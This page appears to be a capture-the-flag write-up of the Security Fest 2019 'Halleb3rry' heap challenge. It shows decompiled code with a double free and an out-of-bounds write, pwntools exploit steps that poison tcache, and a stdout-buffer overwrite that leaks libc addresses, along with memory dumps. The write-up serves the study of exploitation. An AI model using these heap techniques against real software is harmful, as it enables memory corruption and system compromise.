<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>Security Fest 2019 - Halleb3rry | kileak</title>





<meta name="description" content="Security Fest 2019 - Halleb3rry">


<meta name="keywords" content="secfest">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2019/secfest-halleb3rry/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">Security Fest 2019 - Halleb3rry</h1>
      <p class="post-meta">May 24, 2019</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Points: 1003 Solves: 6
<!--break--></p>

  <p>Can you pwn like Halle Berry?</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/secfest19/halleb3rry/halleb3rry.tar.gz">halleb3rry.tar.gz</a> <a href="https://kileak.github.io/assets/secfest19/halleb3rry/xpl.py">xpl.py</a></p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  checksec
[+] checksec for '/usr/bin/socat'
Canary                        : Yes →  value: 0x47c90d877242d400
NX                            : Yes
PIE                           : Yes
Fortify                       : Yes
RelRO                         : Full</code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">++++++++
Heap pwner v01
++++++++

[?] name: AAAA
1) alloc array
2) edit array
3) delete array
4) print name
5) menu
6) exit
&gt; </code></pre></figure>

<p>halleb3rry was quite an interesting heap challenge, which seemed to have no easy way for leaks.</p>

<p>After asking us for a username (which will get stored in <code class="language-plaintext highlighter-rouge">bss</code>), we have the option to create, edit and delete byte arrays. Though we are only allowed to free the array 5 times.</p>

<p>When reading the username, <code class="language-plaintext highlighter-rouge">0x80</code> bytes will be read and the last byte (or newline) will be replaced with a null byte.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">unsigned int read_string(char *buf, int size) {  
  int read_bytes = read(0, buf, size);

  if ( read_bytes == -1 || !read_bytes )
    return 0;

  unsigned int i = 0;
  while ( i &lt; size ) {
    if ( buf[i] == '\n' ) {
      buf[i] = 0;
      return i+1;
    }
    ++i;
  }
  if ( i &gt; 0 )
    buf[i - 1] = 0;

  return i;
}

void read_name(char *buf, unsigned int size) {
  printf("[?] name: ");
  fflush(stdout);
  int read_bytes = read_string(buf, size);

  if ( !read_bytes )
    exit(1);    
}</code></pre></figure>

<p>The username will be stored on the stack, and aligned to it, the menu input will be stored.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x7fffffffe150
0x7fffffffe150:	0x4141414141414141	0x4141414141414141  &lt;= username
0x7fffffffe160:	0x4141414141414141	0x4141414141414141
0x7fffffffe170:	0x4141414141414141	0x4141414141414141
0x7fffffffe180:	0x4141414141414141	0x4141414141414141
0x7fffffffe190:	0x4141414141414141	0x4141414141414141
0x7fffffffe1a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1b0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1c0:	0x4141414141414141	0x0041414141414141
0x7fffffffe1d0:	0x0000000000000000	0x0000000000000000  &lt;= menu_choice
0x7fffffffe1e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe1f0:	0x0000000000000000	0x0000000000000000
0x7fffffffe200:	0x0000000000000000	0x0000000000000000
0x7fffffffe210:	0x0000000000000000	0x0000000000000000
0x7fffffffe220:	0x0000000000000000	0x0000000000000000
0x7fffffffe230:	0x0000000000000000	0x0000000000000000
0x7fffffffe240:	0x0000000000000000	0x0000000000000000
0x7fffffffe250:	0x00007fffffffe340	0xae6bb0b770650f00
0x7fffffffe260:	0x0000000000400eb0	0x00007ffff7a05b97
0x7fffffffe270:	0x0000000000000001	0x00007fffffffe348</code></pre></figure>

<p>If it would be possible to enlarge the username by one byte, it might have been possible to use the <code class="language-plaintext highlighter-rouge">print_name</code> function to leak the following stack address (by giving an option like <code class="language-plaintext highlighter-rouge">0</code>*127+<code class="language-plaintext highlighter-rouge">4</code>), but it didn’t work out for me (might just have been a red herring), so had to find another way to get a proper leak.</p>

<p>So, let’s take a look at create/edit/delete</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create_array</span><span class="p">()</span>
<span class="p">{</span>  
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-98h]</span>
    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>
  
    <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[?] size: "</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_string</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    
    <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">128</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[?] data: "</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="s">"[-] invalid size!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
    <span class="p">}</span>  
<span class="p">}</span></code></pre></figure>

<p>Nothing special here, reads a size, allocates an appropriate chunk and stores it in global <code class="language-plaintext highlighter-rouge">ptr</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">delete_array</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>So, this will just free <code class="language-plaintext highlighter-rouge">ptr</code> without clearing it, allowing a <code class="language-plaintext highlighter-rouge">double free</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">edit_array</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span> 
    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>
  
    <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[?] index: "</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_string</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>                 <span class="c1">// oob write possible</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[?] byte: "</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

        <span class="n">ptr</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="s">"[-] invalid idx!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
    <span class="p">}</span>  
<span class="p">}</span></code></pre></figure>

<p>The edit function doesn’t do the boundary check correctly, so we can write way behind our allocated chunk.</p>

<p>But we still have no leak, and we’d need at least a libc address to do something useful.</p>

<p>I still have the feeling, I overlooked something important (like using the <code class="language-plaintext highlighter-rouge">double free</code> at all), since solving this was going to be quite a ride.</p>

<p>Since at that point, my mind was set up, that we cannot use <code class="language-plaintext highlighter-rouge">print_name</code> for anything useful, the only other option seemed to be leaking via overwriting <code class="language-plaintext highlighter-rouge">stdout</code> buffers.</p>

<p>For getting a leak, we’d thus have to</p>

<ul>
  <li>Create a libc address on the heap</li>
  <li>Overwrite <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> of <code class="language-plaintext highlighter-rouge">stdout</code>, so it will try to flush the output from the heap printing our prepared libc address</li>
</ul>

<p>Since we’re using <code class="language-plaintext highlighter-rouge">tcache</code>, freeing chunks will only put heap addresses in the <code class="language-plaintext highlighter-rouge">FD</code> pointers.</p>

<p>But if you free a chunk, big enough to not be handled by <code class="language-plaintext highlighter-rouge">tcache</code>, <code class="language-plaintext highlighter-rouge">main_arena</code> will be used instead to handle this chunk. So, we just have to forge a chunk on the heap with a size of <code class="language-plaintext highlighter-rouge">0x500</code> for example and free that one. This will put pointers to <code class="language-plaintext highlighter-rouge">main_arena</code> on the heap.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create fake chunk and free it to get main_arena ptr on heap"</span><span class="p">)</span>

<span class="c1"># Setup two chunks on the heap (both freed)
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="c1"># chunk 1
</span><span class="n">delete</span><span class="p">()</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="c1"># chunk 2
</span><span class="n">delete</span><span class="p">()</span>

<span class="c1"># Reallocate first chunk
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Use oob write to overwrite size of chunk 2
</span><span class="n">edit</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">)</span>

<span class="c1"># Use oob write to write some valid next_sizes on heap
</span><span class="n">edit</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x500</span><span class="o">+</span><span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">)</span>

<span class="c1"># Reallocate and free chunk (chunk 2) with fake size, so tcache won't be used
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">delete</span><span class="p">()</span></code></pre></figure>

<p>After this, the heap will look like this</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x604260:	0x0000000000000000	0x0000000000000061  =&gt; Chunk 1
0x604270:	0x0000000000000000	0x4141414141414141
0x604280:	0x4141414141414141	0x4141414141414141
0x604290:	0x4141414141414141	0x4141414141414141
0x6042a0:	0x4141414141414141	0x4141414141414141
0x6042b0:	0x4141414141414141	0x4141414141414141
0x6042c0:	0x0041414141414141	0x0000000000000501  =&gt; Chunk 2 (fake size)
0x6042d0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0  =&gt; ptr to main_arena
0x6042e0:	0x0000000000000000	0x0000000000000000
0x6042f0:	0x4141414141414141	0x4141414141414141
0x604300:	0x4141414141414141	0x4141414141414141
0x604310:	0x4141414141414141	0x4141414141414141
0x604320:	0x4141414141414141	0x4141414141414141
0x604330:	0x0041414141414141	0x000000000001fcd1</code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">tcache arena</code> will be cleared, after we freed the big chunk, so we have to resetup some chunks to do something useful.</p>

<p>And still, we have to find a way to print the content of our heap (for which no functionality in the binary exists).</p>

<p>Since the binary is using <code class="language-plaintext highlighter-rouge">printf</code>, a chunk on the heap is allocated for output buffering</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx stdout
0x7ffff7dd0760 &lt;_IO_2_1_stdout_&gt;:      0x00000000fbad2884	0x0000000000603260 &lt;= flags           / _IO_read_ptr
0x7ffff7dd0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000603260	0x0000000000603260 &lt;= _IO_read_end    / _IO_read_base
0x7ffff7dd0780 &lt;_IO_2_1_stdout_+32&gt;:	0x0000000000603260	0x0000000000603260 &lt;= _IO_write_base  / _IO_write_ptr
0x7ffff7dd0790 &lt;_IO_2_1_stdout_+48&gt;:	0x0000000000604260	0x0000000000603260 &lt;= _IO_write_end   / _IO_buf_base
0x7ffff7dd07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x0000000000604260	0x0000000000000000 &lt;= _IO_buf_end     / _IO_save_base
0x7ffff7dd07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000 &lt;= _IO_backup_base / _IO_save_end
0x7ffff7dd07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007ffff7dcfa00 &lt;= _IO_marker      / _chain
0x7ffff7dd07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff &lt;= _fileno
0x7ffff7dd07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x0000000000000000	0x00007ffff7dd18c0
0x7ffff7dd07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd0800 &lt;_IO_2_1_stdout_+160&gt;:	0x00007ffff7dcf8c0	0x0000000000000000
0x7ffff7dd0810 &lt;_IO_2_1_stdout_+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0820 &lt;_IO_2_1_stdout_+192&gt;:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd0830 &lt;_IO_2_1_stdout_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0

0x603250:	0x0000000000000000	0x0000000000001011
0x603260:	0x61746164205d203e	0x320a79617220203a
0x603270:	0x6120746964652029	0x2029330a79617272
0x603280:	0x61206574656c6564	0x2029340a79617272
0x603290:	0x616e20746e697270	0x656d2029350a656d
0x6032a0:	0x78652029360a756e	0x000000203e0a7469
0x6032b0:	0x0000000000000000	0x0000000000000000
0x6032c0:	0x0000000000000000	0x0000000000000000
0x6032d0:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>If we are able to overwrite <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>, libc will think, there’s still data to print, and spill out the data between <code class="language-plaintext highlighter-rouge">_IO_write_base</code> and <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>.</p>

<p>So, how to get to overwrite anything in <code class="language-plaintext highlighter-rouge">stdout</code> without having a libc address yet?</p>

<p>We’ll be using the fact, that <code class="language-plaintext highlighter-rouge">bss</code> contains a pointer to it…</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x602000
0x602000:	        0x0000000000000000	0x0000000000000000
0x602010:	        0x0000000000000000	0x0000000000000000
0x602020 &lt;stdout&gt;:	0x00007ffff7dd0760	0x0000000000000000
0x602030:	        0x0000000000000000	0x0000000000000000
0x602040 &lt;stderr&gt;:	0x00007ffff7dd0680	0x0000000000000000
0x602050:	        0x0000000000000000	0x0000000000000000
0x602060:	        0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Since allocating a chunk into <code class="language-plaintext highlighter-rouge">stdout</code> itself, might crash the application, when following allocations write a FD pointer into it, we’ll use <code class="language-plaintext highlighter-rouge">stderr</code> instead, which happens to be just above <code class="language-plaintext highlighter-rouge">stdout</code>.</p>

<p>To pull this off, we’ll now prepare two freed chunks again (which will be handled by <code class="language-plaintext highlighter-rouge">tcache</code> again) and then overwrite the <code class="language-plaintext highlighter-rouge">FD</code> of a freed chunk with the address of <code class="language-plaintext highlighter-rouge">stderr</code> (on bss).</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">write_off</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
		<span class="n">edit</span><span class="p">(</span><span class="n">off</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>

<span class="p">...</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Setup some chunks and overwrite freed FD pointing to stdout pointer"</span><span class="p">)</span>

<span class="c1"># Allocate two aligned chunks (both in tcache bin list)
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
<span class="n">delete</span><span class="p">()</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
<span class="n">delete</span><span class="p">()</span>

<span class="c1"># Allocate first chunk again
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"Y"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>

<span class="c1"># Overwrite FD of following chunk with pointer to stdout	
</span><span class="n">write_off</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602040</span><span class="p">))</span>

<span class="c1"># Allocate chunk to get stdout pointer into fastbin list
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"X"</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">tcache</code> will now contain the address of <code class="language-plaintext highlighter-rouge">stdout</code> on bss.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000251
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000602040 &lt;= stderr
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Now, when we allocate the next chunk, <code class="language-plaintext highlighter-rouge">malloc</code> will serve us the chunk at <code class="language-plaintext highlighter-rouge">0x602040</code></p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x602040 &lt;stderr&gt;:	0x00007ffff7dd0680	0x0000000000000000
0x602050:	        0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>and put the <code class="language-plaintext highlighter-rouge">"FD"</code> from this chunk (which happens to be the address of <code class="language-plaintext highlighter-rouge">stderr</code>) into the bin list.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000251
0x603010:	0x0000ff0000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x00007ffff7dd0680  &lt;= stderr
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Thus allocating another chunk will now give us a chunk inside <code class="language-plaintext highlighter-rouge">stderr</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunk to get stderr pointer into bin list"</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunk inside stderr"</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">stderr</code> will be broken from now on, so be cautious to not trigger an error message, or it will crash.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x602000
0x602000:	        0x0000000000000000	0x0000000000000000
0x602010:	        0x0000000000000000	0x0000000000000000
0x602020 &lt;stdout&gt;:	0x00007ffff7dd0760	0x0000000000000000
0x602030:	        0x0000000000000000	0x0000000000000000
0x602040 &lt;stderr&gt;:	0x00007ffff7dd0600	0x0000000000000000
0x602050:	        0x0000000000000000	0x00007ffff7dd0680  &lt;== ptr

gef➤  x/30gx stdout
0x7ffff7dd0760 &lt;_IO_2_1_stdout_&gt;:      0x00000000fbad2884	0x0000000000603260 &lt;= flags           / _IO_read_ptr
0x7ffff7dd0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000603260	0x0000000000603260 &lt;= _IO_read_end    / _IO_read_base
0x7ffff7dd0780 &lt;_IO_2_1_stdout_+32&gt;:	0x0000000000603260	0x0000000000603260 &lt;= _IO_write_base  / _IO_write_ptr
0x7ffff7dd0790 &lt;_IO_2_1_stdout_+48&gt;:	0x0000000000604260	0x0000000000603260 &lt;= _IO_write_end   / _IO_buf_base
0x7ffff7dd07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x0000000000604260	0x0000000000000000 &lt;= _IO_buf_end     / _IO_save_base
0x7ffff7dd07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000 &lt;= _IO_backup_base / _IO_save_end
0x7ffff7dd07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007ffff7dcfa00 &lt;= _IO_marker      / _chain
0x7ffff7dd07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff &lt;= _fileno</code></pre></figure>

<p>We now have <code class="language-plaintext highlighter-rouge">ptr</code> pointing to <code class="language-plaintext highlighter-rouge">stderr</code> (which is above <code class="language-plaintext highlighter-rouge">stdout</code>) and can use this to overwrite <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>. Overwriting the LSB will get us nowhere, since it will only print stuff inside the stdout buffer, but overwriting the second byte should give us a huge leak.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite _IO_write_ptr"</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x109</span><span class="p">))</span>	
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"byte: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">x00\x00[DEBUG] Received 0x1000 bytes:
    00000000  00 00 00 00  00 00 00 00  61 00 00 00  00 00 00 00  │····│····│a···│····│
    00000010  00 00 00 00  00 00 00 00  41 41 41 41  41 41 41 41  │····│····│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 00  61 00 00 00  00 00 00 00  │AAAA│AAA·│a···│····│
    00000070  59 59 59 59  59 59 59 59  59 59 59 59  59 59 59 59  │YYYY│YYYY│YYYY│YYYY│
    *
    000000c0  59 59 59 59  59 59 59 00  71 00 00 00  00 00 00 00  │YYYY│YYY·│q···│····│
    000000d0  58 58 58 58  58 58 58 58  58 58 43 43  43 43 43 43  │XXXX│XXXX│XXCC│CCCC│
    000000e0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    00000130  43 43 43 43  43 43 43 00  31 04 00 00  00 00 00 00  │CCCC│CCC·│1···│····│
    00000140  a0 fc 81 9d  8e 7f 00 00  a0 fc 81 9d  8e 7f 00 00  │····│····│····│····│ &lt;= main_arena ptr
    00000150  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000560  30 04 00 00  00 00 00 00  70 00 00 00  00 00 00 00  │0···│····│p···│····│
    00000570  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000005d0  00 00 00 00  00 00 00 00  71 00 00 00  00 00 00 00  │····│····│q···│····│
